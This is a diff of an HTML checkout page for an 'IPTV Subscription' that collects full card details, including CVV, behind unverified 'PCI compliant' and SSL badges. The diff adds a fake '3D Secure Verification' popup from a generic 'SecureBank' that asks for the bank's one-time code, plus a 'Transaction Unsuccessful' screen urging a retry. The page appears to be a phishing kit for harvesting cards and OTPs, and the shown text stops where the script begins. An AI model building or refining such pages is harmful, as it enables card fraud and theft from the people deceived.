@@ -1,712 +1,834 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5">
-  <title>IPTV · Premium Checkout</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      background: #F7F8FC;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      color: #111827;
-      padding: 1.5rem;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .checkout-container {
-      max-width: 1280px;
-      width: 100%;
-      margin: 0 auto;
-      display: grid;
-      grid-template-columns: 1fr 380px;
-      gap: 2rem;
-      background: #F7F8FC;
-      border-radius: 2.5rem;
-      padding: 1.5rem;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.04);
-    }
-    .form-section {
-      background: white;
-      border-radius: 2rem;
-      padding: 2rem 2rem 2.5rem;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.03);
-      transition: all 0.2s;
-    }
-    .form-section h1 {
-      font-size: 1.9rem;
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      margin-bottom: 0.25rem;
-      color: #111827;
-    }
-    .form-section .subhead {
-      font-size: 0.95rem;
-      color: #4b5563;
-      margin-bottom: 1.8rem;
-      border-left: 3px solid #2563EB;
-      padding-left: 0.75rem;
-      font-weight: 400;
-    }
-    .form-grid {
-      display: flex;
-      flex-direction: column;
-      gap: 1.25rem;
-    }
-    .form-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 1rem;
-    }
-    .form-group {
-      display: flex;
-      flex-direction: column;
-      gap: 0.3rem;
-    }
-    .form-group label {
-      font-size: 0.8rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.02em;
-      color: #374151;
-    }
-    .form-group input, .form-group select {
-      padding: 0.75rem 1rem;
-      border: 1.5px solid #E5E7EB;
-      border-radius: 14px;
-      font-size: 0.95rem;
-      background: white;
-      transition: 0.2s;
-      font-family: 'Inter', sans-serif;
-      outline: none;
-      width: 100%;
-    }
-    .form-group input:focus, .form-group select:focus {
-      border-color: #2563EB;
-      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
-    }
-    .form-group input.error {
-      border-color: #dc2626;
-      background-color: #fef2f2;
-    }
-    .form-group .error-msg {
-      font-size: 0.7rem;
-      color: #dc2626;
-      min-height: 1.2rem;
-    }
-    .payment-section {
-      margin-top: 1.5rem;
-      background: #f9faff;
-      padding: 1.5rem 1.5rem 1.2rem;
-      border-radius: 1.5rem;
-      border: 1px solid #eef2f6;
-    }
-    .payment-section h3 {
-      font-size: 1.1rem;
-      font-weight: 600;
-      margin-bottom: 1.2rem;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-    .card-icons {
-      display: flex;
-      gap: 0.6rem;
-      margin-left: auto;
-      color: #6b7280;
-      font-size: 1.4rem;
-    }
-    .card-icons i {
-      background: white;
-      padding: 0.2rem 0.5rem;
-      border-radius: 8px;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.02);
-      border: 1px solid #e5e7eb;
-    }
-    .card-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 0.8rem;
-      margin-top: 0.2rem;
-    }
-    .card-row .form-group:first-child {
-      grid-column: span 2;
-    }
-    .secure-badge {
-      display: flex;
-      align-items: center;
-      gap: 0.4rem;
-      font-size: 0.75rem;
-      color: #4b5563;
-      background: #eef2f6;
-      padding: 0.5rem 1rem;
-      border-radius: 40px;
-      margin-top: 1.2rem;
-      width: fit-content;
-    }
-    .secure-badge i {
-      color: #2563EB;
-    }
-    .trust-badges {
-      display: flex;
-      gap: 1.2rem;
-      font-size: 0.75rem;
-      color: #4b5563;
-      margin-top: 0.5rem;
-      flex-wrap: wrap;
-    }
-    .trust-badges i {
-      color: #16A34A;
-      margin-right: 0.2rem;
-    }
-    .btn-primary {
-      background: #2563EB;
-      border: none;
-      padding: 1rem 1.5rem;
-      border-radius: 60px;
-      font-weight: 600;
-      font-size: 1.1rem;
-      color: white;
-      width: 100%;
-      margin-top: 1.8rem;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
-      letter-spacing: 0.3px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-    }
-    .btn-primary:hover {
-      background: #1E40AF;
-      transform: scale(1.01);
-      box-shadow: 0 12px 28px rgba(37, 99, 235, 0.3);
-    }
-    .btn-primary:disabled {
-      opacity: 0.6;
-      pointer-events: none;
-    }
-    .order-summary {
-      background: white;
-      border-radius: 2rem;
-      padding: 2rem 1.5rem 1.8rem;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.02);
-      align-self: start;
-      position: sticky;
-      top: 1.5rem;
-      border: 1px solid #f1f3f7;
-    }
-    .order-summary .summary-icon {
-      font-size: 2.4rem;
-      color: #2563EB;
-      background: #eef4ff;
-      width: 60px;
-      height: 60px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 20px;
-      margin-bottom: 1rem;
-    }
-    .summary-item {
-      display: flex;
-      justify-content: space-between;
-      padding: 0.6rem 0;
-      border-bottom: 1px solid #f1f3f7;
-      font-size: 0.95rem;
-    }
-    .summary-item:last-child {
-      border-bottom: none;
-      font-weight: 700;
-      font-size: 1.2rem;
-      padding-top: 0.8rem;
-      margin-top: 0.2rem;
-      border-top: 2px solid #e5e7eb;
-    }
-    .summary-total {
-      color: #111827;
-    }
-    .secure-checkout-badge {
-      margin-top: 1.5rem;
-      background: #f0f4fe;
-      border-radius: 40px;
-      padding: 0.5rem 1rem;
-      font-size: 0.75rem;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.4rem;
-      color: #1E40AF;
-    }
-    .loading-overlay, .success-overlay, .sms-overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.3);
-      backdrop-filter: blur(6px);
-      align-items: center;
-      justify-content: center;
-      z-index: 999;
-      padding: 1rem;
-    }
-    .loading-card, .success-card, .sms-card {
-      background: white;
-      max-width: 400px;
-      width: 100%;
-      padding: 2.5rem 2rem;
-      border-radius: 2.5rem;
-      text-align: center;
-      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
-      animation: fadeUp 0.3s ease;
-    }
-    .spinner {
-      width: 48px;
-      height: 48px;
-      border: 4px solid #e5e7eb;
-      border-top: 4px solid #2563EB;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin: 0 auto 1.2rem;
-    }
-    .success-card i {
-      font-size: 3.5rem;
-      color: #16A34A;
-      margin-bottom: 0.5rem;
-    }
-    .sms-card input {
-      padding: 0.7rem 1rem;
-      border-radius: 40px;
-      border: 1.5px solid #d1d5db;
-      width: 100%;
-      margin: 0.8rem 0;
-      font-size: 1rem;
-      text-align: center;
-      letter-spacing: 4px;
-    }
-    .sms-card .btn-sms {
-      background: #2563EB;
-      border: none;
-      color: white;
-      padding: 0.7rem 1.5rem;
-      border-radius: 40px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-    }
-    .sms-card .btn-sms:hover {
-      background: #1E40AF;
-    }
-    .sms-card .close-sms {
-      margin-top: 0.8rem;
-      background: transparent;
-      border: none;
-      color: #6b7280;
-      font-size: 0.85rem;
-      cursor: pointer;
-      text-decoration: underline;
-    }
-    .sms-card .error-message {
-      color: #dc2626;
-      background: #fef2f2;
-      padding: 0.5rem;
-      border-radius: 8px;
-      margin-top: 0.5rem;
-      font-size: 0.85rem;
-      font-weight: 500;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-    @media (max-width: 1024px) {
-      .checkout-container {
-        grid-template-columns: 1fr;
-        gap: 1.5rem;
-      }
-      .order-summary {
-        position: static;
-      }
-    }
-    @media (max-width: 600px) {
-      .form-row {
-        grid-template-columns: 1fr;
-      }
-      .card-row {
-        grid-template-columns: 1fr 1fr;
-      }
-      .card-row .form-group:first-child {
-        grid-column: span 2;
-      }
-      .checkout-container {
-        padding: 0.5rem;
-      }
-      .form-section {
-        padding: 1.5rem;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5">
+    <title>IPTV · Premium Checkout</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #F7F8FC;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: #111827;
+            padding: 1.5rem;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .checkout-container {
+            max-width: 1280px;
+            width: 100%;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 2rem;
+            background: #F7F8FC;
+            border-radius: 2.5rem;
+            padding: 1.5rem;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.04);
+        }
+        .form-section {
+            background: white;
+            border-radius: 2rem;
+            padding: 2rem 2rem 2.5rem;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.03);
+            transition: all 0.2s;
+        }
+        .form-section h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            margin-bottom: 0.25rem;
+            color: #111827;
+        }
+        .form-section .subhead {
+            font-size: 0.95rem;
+            color: #4b5563;
+            margin-bottom: 1.8rem;
+            border-left: 3px solid #2563EB;
+            padding-left: 0.75rem;
+            font-weight: 400;
+        }
+        .form-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+        }
+        .form-group label {
+            font-size: 0.8rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.02em;
+            color: #374151;
+        }
+        .form-group input,
+        .form-group select {
+            padding: 0.75rem 1rem;
+            border: 1.5px solid #E5E7EB;
+            border-radius: 14px;
+            font-size: 0.95rem;
+            background: white;
+            transition: 0.2s;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            width: 100%;
+        }
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: #2563EB;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
+        }
+        .form-group input.error {
+            border-color: #dc2626;
+            background-color: #fef2f2;
+        }
+        .form-group .error-msg {
+            font-size: 0.7rem;
+            color: #dc2626;
+            min-height: 1.2rem;
+        }
+        .payment-section {
+            margin-top: 1.5rem;
+            background: #f9faff;
+            padding: 1.5rem 1.5rem 1.2rem;
+            border-radius: 1.5rem;
+            border: 1px solid #eef2f6;
+        }
+        .payment-section h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .card-icons {
+            display: flex;
+            gap: 0.6rem;
+            margin-left: auto;
+            color: #6b7280;
+            font-size: 1.4rem;
+        }
+        .card-icons i {
+            background: white;
+            padding: 0.2rem 0.5rem;
+            border-radius: 8px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.02);
+            border: 1px solid #e5e7eb;
+        }
+        .card-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.8rem;
+            margin-top: 0.2rem;
+        }
+        .card-row .form-group:first-child {
+            grid-column: span 2;
+        }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.75rem;
+            color: #4b5563;
+            background: #eef2f6;
+            padding: 0.5rem 1rem;
+            border-radius: 40px;
+            margin-top: 1.2rem;
+            width: fit-content;
+        }
+        .secure-badge i {
+            color: #2563EB;
+        }
+        .trust-badges {
+            display: flex;
+            gap: 1.2rem;
+            font-size: 0.75rem;
+            color: #4b5563;
+            margin-top: 0.5rem;
+            flex-wrap: wrap;
+        }
+        .trust-badges i {
+            color: #16A34A;
+            margin-right: 0.2rem;
+        }
+        .btn-primary {
+            background: #2563EB;
+            border: none;
+            padding: 1rem 1.5rem;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            color: white;
+            width: 100%;
+            margin-top: 1.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+        .btn-primary:hover {
+            background: #1E40AF;
+            transform: scale(1.01);
+            box-shadow: 0 12px 28px rgba(37, 99, 235, 0.3);
+        }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        .order-summary {
+            background: white;
+            border-radius: 2rem;
+            padding: 2rem 1.5rem 1.8rem;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.02);
+            align-self: start;
+            position: sticky;
+            top: 1.5rem;
+            border: 1px solid #f1f3f7;
+        }
+        .order-summary .summary-icon {
+            font-size: 2.4rem;
+            color: #2563EB;
+            background: #eef4ff;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 20px;
+            margin-bottom: 1rem;
+        }
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.6rem 0;
+            border-bottom: 1px solid #f1f3f7;
+            font-size: 0.95rem;
+        }
+        .summary-item:last-child {
+            border-bottom: none;
+            font-weight: 700;
+            font-size: 1.2rem;
+            padding-top: 0.8rem;
+            margin-top: 0.2rem;
+            border-top: 2px solid #e5e7eb;
+        }
+        .summary-total {
+            color: #111827;
+        }
+        .secure-checkout-badge {
+            margin-top: 1.5rem;
+            background: #f0f4fe;
+            border-radius: 40px;
+            padding: 0.5rem 1rem;
+            font-size: 0.75rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            color: #1E40AF;
+        }
+        .loading-overlay,
+        .success-overlay,
+        .sms-overlay,
+        .error-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(8px);
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            padding: 1rem;
+        }
+        .loading-card,
+        .success-card,
+        .sms-card,
+        .error-card {
+            background: white;
+            max-width: 420px;
+            width: 100%;
+            padding: 2.5rem 2rem;
+            border-radius: 2.5rem;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
+            animation: fadeUp 0.3s ease;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #2563EB;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 1.2rem;
+        }
+        .success-card i {
+            font-size: 3.5rem;
+            color: #16A34A;
+            margin-bottom: 0.5rem;
+        }
+        .error-card i {
+            font-size: 3.5rem;
+            color: #dc2626;
+            margin-bottom: 0.5rem;
+        }
+        .error-card .error-title {
+            color: #dc2626;
+            font-weight: 700;
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+        }
+        .error-card .error-sub {
+            color: #4b5563;
+            font-size: 0.95rem;
+            margin-bottom: 1.5rem;
+        }
+        .sms-card input {
+            padding: 0.7rem 1rem;
+            border-radius: 40px;
+            border: 1.5px solid #d1d5db;
+            width: 100%;
+            margin: 0.8rem 0;
+            font-size: 1rem;
+            text-align: center;
+            letter-spacing: 4px;
+        }
+        .sms-card input:focus {
+            border-color: #2563EB;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
+            outline: none;
+        }
+        .sms-card .btn-sms {
+            background: #2563EB;
+            border: none;
+            color: white;
+            padding: 0.7rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+        }
+        .sms-card .btn-sms:hover {
+            background: #1E40AF;
+        }
+        .sms-card .btn-sms:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .sms-card .close-sms {
+            margin-top: 0.8rem;
+            background: transparent;
+            border: none;
+            color: #6b7280;
+            font-size: 0.85rem;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .sms-card .error-message {
+            color: #dc2626;
+            background: #fef2f2;
+            padding: 0.5rem;
+            border-radius: 8px;
+            margin-top: 0.5rem;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        .sms-info {
+            background: #f0f4fe;
+            border-radius: 12px;
+            padding: 0.8rem;
+            margin: 0.8rem 0;
+            font-size: 0.9rem;
+            color: #1E40AF;
+            text-align: left;
+        }
+        .sms-info i {
+            margin-right: 0.5rem;
+            color: #2563EB;
+        }
+        .sms-info .highlight {
+            font-weight: 600;
+            color: #1E40AF;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        @media (max-width: 1024px) {
+            .checkout-container {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+            .order-summary {
+                position: static;
+            }
+        }
+        @media (max-width: 600px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            .card-row {
+                grid-template-columns: 1fr 1fr;
+            }
+            .card-row .form-group:first-child {
+                grid-column: span 2;
+            }
+            .checkout-container {
+                padding: 0.5rem;
+            }
+            .form-section {
+                padding: 1.5rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="checkout-container">
-    <!-- Left: Form -->
-    <div class="form-section">
-      <h1>Complete your order</h1>
-      <div class="subhead"><i class="fas fa-lock" style="margin-right: 0.4rem; color:#2563EB;"></i> Secure checkout · 256-bit SSL</div>
-      
-      <form id="checkoutForm" novalidate>
-        <div class="form-grid">
-          <!-- Customer Info -->
-          <div class="form-group">
-            <label for="fullname">Full name</label>
-            <input type="text" id="fullname" placeholder="John Doe" required>
-            <div class="error-msg" id="fullnameError"></div>
-          </div>
-          <div class="form-group">
-            <label for="email">Email address</label>
-            <input type="email" id="email" placeholder="john@example.com" required>
-            <div class="error-msg" id="emailError"></div>
-          </div>
-          <div class="form-group">
-            <label for="address">Street address</label>
-            <input type="text" id="address" placeholder="123 Main St" required>
-            <div class="error-msg" id="addressError"></div>
-          </div>
-          <div class="form-row">
-            <div class="form-group">
-              <label for="city">City</label>
-              <input type="text" id="city" placeholder="Prague" required>
-              <div class="error-msg" id="cityError"></div>
-            </div>
-            <div class="form-group">
-              <label for="state">State / Region</label>
-              <input type="text" id="state" placeholder="Hlavní město" required>
-              <div class="error-msg" id="stateError"></div>
-            </div>
-          </div>
-          <div class="form-row">
-            <div class="form-group">
-              <label for="zip">ZIP / Postal code</label>
-              <input type="text" id="zip" placeholder="11000" required>
-              <div class="error-msg" id="zipError"></div>
-            </div>
-            <div class="form-group">
-              <label for="country">Country</label>
-              <select id="country">
-                <option value="Czech Republic" selected>Czech Republic</option>
-                <option value="Germany">Germany</option>
-                <option value="France">France</option>
-                <option value="Italy">Italy</option>
-                <option value="Spain">Spain</option>
-                <option value="Netherlands">Netherlands</option>
-                <option value="Belgium">Belgium</option>
-                <option value="Austria">Austria</option>
-                <option value="Poland">Poland</option>
-                <option value="Slovakia">Slovakia</option>
-                <option value="Portugal">Portugal</option>
-                <option value="United Kingdom">United Kingdom</option>
-                <option value="United States">United States</option>
-                <option value="Canada">Canada</option>
-                <option value="Australia">Australia</option>
-                <option value="Switzerland">Switzerland</option>
-              </select>
-            </div>
-          </div>
+    <div class="checkout-container">
+        <!-- Left: Form -->
+        <div class="form-section">
+            <h1>Complete your order</h1>
+            <div class="subhead"><i class="fas fa-lock" style="margin-right: 0.4rem; color:#2563EB;"></i> Secure checkout · 256-bit SSL</div>
 
-          <!-- Payment -->
-          <div class="payment-section">
-            <h3>💳 Payment <span class="card-icons"><i class="fab fa-cc-visa"></i><i class="fab fa-cc-mastercard"></i><i class="fab fa-cc-amex"></i></span></h3>
-            <div class="form-group">
-              <label for="cardName">Cardholder name</label>
-              <input type="text" id="cardName" placeholder="John Doe" required>
-              <div class="error-msg" id="cardNameError"></div>
-            </div>
-            <div class="form-group">
-              <label for="cardNumber">Card number</label>
-              <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-              <div class="error-msg" id="cardNumberError"></div>
-            </div>
-            <div class="card-row">
-              <div class="form-group">
-                <label for="expiry">Expiry (MM/YY)</label>
-                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
-                <div class="error-msg" id="expiryError"></div>
-              </div>
-              <div class="form-group">
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" placeholder="•••" maxlength="4" required>
-                <div class="error-msg" id="cvvError"></div>
-              </div>
-            </div>
-            <div class="secure-badge"><i class="fas fa-lock"></i> Your payment is protected with 256-bit SSL encryption.</div>
-            <div class="trust-badges">
-              <span><i class="fas fa-shield-alt"></i> Secure payment</span>
-              <span><i class="fas fa-check-circle"></i> PCI compliant</span>
-            </div>
-          </div>
+            <form id="checkoutForm" novalidate>
+                <div class="form-grid">
+                    <!-- Customer Info -->
+                    <div class="form-group">
+                        <label for="fullname">Full name</label>
+                        <input type="text" id="fullname" placeholder="John Doe" required>
+                        <div class="error-msg" id="fullnameError"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email address</label>
+                        <input type="email" id="email" placeholder="john@example.com" required>
+                        <div class="error-msg" id="emailError"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="address">Street address</label>
+                        <input type="text" id="address" placeholder="123 Main St" required>
+                        <div class="error-msg" id="addressError"></div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="city">City</label>
+                            <input type="text" id="city" placeholder="Prague" required>
+                            <div class="error-msg" id="cityError"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="state">State / Region</label>
+                            <input type="text" id="state" placeholder="Hlavní město" required>
+                            <div class="error-msg" id="stateError"></div>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="zip">ZIP / Postal code</label>
+                            <input type="text" id="zip" placeholder="11000" required>
+                            <div class="error-msg" id="zipError"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="country">Country</label>
+                            <select id="country">
+                                <option value="Czech Republic" selected>Czech Republic</option>
+                                <option value="Germany">Germany</option>
+                                <option value="France">France</option>
+                                <option value="Italy">Italy</option>
+                                <option value="Spain">Spain</option>
+                                <option value="Netherlands">Netherlands</option>
+                                <option value="Belgium">Belgium</option>
+                                <option value="Austria">Austria</option>
+                                <option value="Poland">Poland</option>
+                                <option value="Slovakia">Slovakia</option>
+                                <option value="Portugal">Portugal</option>
+                                <option value="United Kingdom">United Kingdom</option>
+                                <option value="United States">United States</option>
+                                <option value="Canada">Canada</option>
+                                <option value="Australia">Australia</option>
+                                <option value="Switzerland">Switzerland</option>
+                            </select>
+                        </div>
+                    </div>
 
-          <button type="submit" class="btn-primary" id="submitBtn"><i class="fas fa-lock"></i> Complete Secure Payment</button>
+                    <!-- Payment -->
+                    <div class="payment-section">
+                        <h3>💳 Payment <span class="card-icons"><i class="fab fa-cc-visa"></i><i class="fab fa-cc-mastercard"></i><i class="fab fa-cc-amex"></i></span></h3>
+                        <div class="form-group">
+                            <label for="cardName">Cardholder name</label>
+                            <input type="text" id="cardName" placeholder="John Doe" required>
+                            <div class="error-msg" id="cardNameError"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="cardNumber">Card number</label>
+                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                            <div class="error-msg" id="cardNumberError"></div>
+                        </div>
+                        <div class="card-row">
+                            <div class="form-group">
+                                <label for="expiry">Expiry (MM/YY)</label>
+                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                                <div class="error-msg" id="expiryError"></div>
+                            </div>
+                            <div class="form-group">
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" placeholder="•••" maxlength="4" required>
+                                <div class="error-msg" id="cvvError"></div>
+                            </div>
+                        </div>
+                        <div class="secure-badge"><i class="fas fa-lock"></i> Your payment is protected with 256-bit SSL encryption.</div>
+                        <div class="trust-badges">
+                            <span><i class="fas fa-shield-alt"></i> Secure payment</span>
+                            <span><i class="fas fa-check-circle"></i> PCI compliant</span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-primary" id="submitBtn"><i class="fas fa-lock"></i> Complete Secure Payment</button>
+                </div>
+            </form>
         </div>
-      </form>
+
+        <!-- Right: Order Summary -->
+        <div class="order-summary">
+            <div class="summary-icon"><i class="fas fa-tv"></i></div>
+            <h3 style="font-weight: 600; margin-bottom: 0.25rem;">IPTV Subscription</h3>
+            <div style="color: #4b5563; font-size: 0.9rem; margin-bottom: 1rem;">6 Months</div>
+            <div class="summary-item"><span>Subscription</span><span>6 Months</span></div>
+            <div class="summary-item"><span>Price</span><span>$49.73 USD</span></div>
+            <div class="summary-item summary-total"><span>Total</span><span>$49.73 USD</span></div>
+            <div class="secure-checkout-badge"><i class="fas fa-check-circle"></i> Secure checkout</div>
+            <div style="margin-top: 1rem; font-size: 0.7rem; color: #6b7280;"><i class="fas fa-credit-card"></i> 256-bit SSL encryption</div>
+        </div>
     </div>
 
-    <!-- Right: Order Summary -->
-    <div class="order-summary">
-      <div class="summary-icon"><i class="fas fa-tv"></i></div>
-      <h3 style="font-weight: 600; margin-bottom: 0.25rem;">IPTV Subscription</h3>
-      <div style="color: #4b5563; font-size: 0.9rem; margin-bottom: 1rem;">6 Months</div>
-      <div class="summary-item"><span>Subscription</span><span>6 Months</span></div>
-      <div class="summary-item"><span>Price</span><span>$49.73 USD</span></div>
-      <div class="summary-item summary-total"><span>Total</span><span>$49.73 USD</span></div>
-      <div class="secure-checkout-badge"><i class="fas fa-check-circle"></i> Secure checkout</div>
-      <div style="margin-top: 1rem; font-size: 0.7rem; color: #6b7280;"><i class="fas fa-credit-card"></i> 256-bit SSL encryption</div>
+    <!-- Overlays -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-card">
+            <div class="spinner"></div>
+            <h3>Processing payment...</h3>
+            <p style="color:#4b5563;">Please wait</p>
+        </div>
     </div>
-  </div>
 
-  <!-- Overlays -->
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-card"><div class="spinner"></div><h3>Processing payment...</h3><p style="color:#4b5563;">Please wait</p></div>
-  </div>
-  <div class="success-overlay" id="successOverlay">
-    <div class="success-card"><i class="fas fa-check-circle"></i><h2>Payment successful</h2><p style="color:#4b5563;">Your IPTV subscription is active.</p><button class="btn-primary" style="margin-top:1.2rem;" onclick="location.reload()">Continue</button></div>
-  </div>
-  <div class="sms-overlay" id="smsOverlay">
-    <div class="sms-card">
-      <i class="fas fa-mobile-alt" style="font-size:2rem; color:#2563EB;"></i>
-      <h3>Verify your phone</h3>
-      <p style="font-size:0.9rem; color:#4b5563;">We sent a code to your phone</p>
-      <input type="text" id="smsCode" placeholder="000000" maxlength="6">
-      <button class="btn-sms" id="smsVerifyBtn">Verify code</button>
-      <div id="smsError" class="error-message" style="display:none;">❌ Transaction not successful</div>
-      <button class="close-sms" id="smsCloseBtn">Close</button>
+    <div class="sms-overlay" id="smsOverlay">
+        <div class="sms-card">
+            <i class="fas fa-shield-alt" style="font-size:2rem; color:#2563EB;"></i>
+            <h3>3D Secure Verification</h3>
+            <p style="font-size:0.9rem; color:#4b5563;">We've sent a verification code to your phone</p>
+            
+            <div class="sms-info">
+                <i class="fas fa-phone"></i>
+                <span>Bank: <span class="highlight">SecureBank</span></span><br>
+                <span style="font-size:0.85rem; color:#4b5563;">A one-time verification code has been sent to your registered mobile number.</span>
+            </div>
+            
+            <p style="font-size:0.85rem; color:#6b7280; margin-top:0.5rem;">Enter the code you received on your phone:</p>
+            
+            <input type="text" id="smsCode" placeholder="Enter the code" maxlength="6" autocomplete="off">
+            <button class="btn-sms" id="smsVerifyBtn">Verify & Complete Payment</button>
+            <div id="smsError" class="error-message" style="display:none;"></div>
+            <button class="close-sms" id="smsCloseBtn">Cancel Transaction</button>
+        </div>
     </div>
-  </div>
 
-  <script>
-    (function() {
-      "use strict";
+    <div class="error-overlay" id="errorOverlay">
+        <div class="error-card">
+            <i class="fas fa-times-circle"></i>
+            <div class="error-title">Transaction Unsuccessful</div>
+            <div class="error-sub">We were unable to process your payment. Please try again.</div>
+            <button class="btn-primary" onclick="location.reload()" style="margin-top:0.5rem;">Try Again</button>
+        </div>
+    </div>
 
-      const form = document.getElementById('checkoutForm');
-      const submitBtn = document.getElementById('submitBtn');
-      const loadingOverlay = document.getElementById('loadingOverlay');
-      const successOverlay = document.getElementById('successOverlay');
